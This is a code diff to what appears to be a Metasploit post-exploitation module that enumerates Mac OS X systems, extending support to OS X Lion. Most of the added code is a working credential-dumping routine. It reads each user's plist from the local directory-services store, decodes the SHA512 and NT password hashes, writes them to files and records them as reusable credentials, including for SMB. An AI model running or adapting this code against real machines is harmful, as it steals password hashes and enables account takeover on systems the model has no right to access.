@@ -25,8 +25,8 @@ class Metasploit3 < Msf::Post
 		super( update_info( info,
 				'Name'          => 'OS X Gather Mac OS X System Information Enumeration',
 				'Description'   => %q{
-						This module gathers basic system information from Mac OS X Tiger, Leopard
-					and Snow Leopard systems.
+						This module gathers basic system information from Mac OS X Tiger, Leopard,
+					Snow Leopard and Lion systems.
 				},
 				'License'       => MSF_LICENSE,
 				'Author'        => [ 'Carlos Perez <carlos_perez[at]darkoperator.com>'],
@@ -227,7 +227,7 @@ class Metasploit3 < Msf::Post
 			"Groups" => ["/usr/sbin/lookupd","-q group"]
 
 			}
-		if ver_num =~ /10\.(6|5)/
+		if ver_num =~ /10\.(7|6|5)/
 			shell_commands = leopard_commands
 		else
 			shell_commands = tiger_commands
@@ -346,7 +346,7 @@ class Metasploit3 < Msf::Post
 
 	# Method  for capturing screenshot of targets
 	def screenshot(log_folder, ver_num)
-		if ver_num =~ /10\.(6|5)/
+		if ver_num =~ /10\.(7|6|5)/
 			print_status("Capturing screenshot")
 			picture_name = ::Time.now.strftime("%Y%m%d.%M%S")
 			if check_root
@@ -476,6 +476,52 @@ class Metasploit3 < Msf::Post
 				when /shell/
 					guid = session.shell_command_token("/usr/bin/niutil -readprop . /users/#{user} generateduid").chomp
 				end
+			elsif ver_num =~ /10\.(7)/
+				require 'rexml/document'
+				hash_decoded = ""
+				profiles = cmd_exec("ls /private/var/db/dslocal/nodes/Default/users").split("\n")
+				if profiles
+					profiles.each do |p|
+						next if p =~ /^_/
+						next if p =~ /^daemon|root|nobody/
+						cmd_exec("cp /private/var/db/dslocal/nodes/Default/users/#{p.chomp} /tmp/")
+						cmd_exec("plutil -convert xml1 /tmp/#{p.chomp}")
+						file = cmd_exec("cat /tmp/#{p.chomp}")
+						doc = REXML::Document.new(file)
+						hash_text = doc.elements.to_a("///array")[2].elements["data"].text.gsub("\n\t\t","")
+						hash_text.unpack('m')[0].each_byte do |b|
+							hash_decoded << sprintf("%02X", b)
+						end
+						user = p.scan(/(\S*)\.plist/)
+						sha512 = hash_decoded.slice(104..213)
+						nt_hash = hash_decoded.slice(214..249)
+
+						print_status("SHA512:#{user}:#{sha512}")
+						file_local_write(sha1_file,"#{user}:#{sha512}")
+						report_auth_info(
+							:host   => host,
+							:port   => 0,
+							:sname  => 'sha512',
+							:user   => user,
+							:pass   => sha512,
+							:active => false
+						)
+
+						if nt_hash !~ /000000000000000/
+							print_status("NT:#{user}:#{nt_hash}")
+							file_local_write(nt_file,"#{user}:#{nt_hash}")
+							report_auth_info(
+								:host   => host,
+								:port   => 445,
+								:sname  => 'smb',
+								:user   => user,
+								:pass   => nt_hash,
+								:active => true
+							)
+						end
+					end
+				end
+				return
 			end
 
 			# Extract the hashes
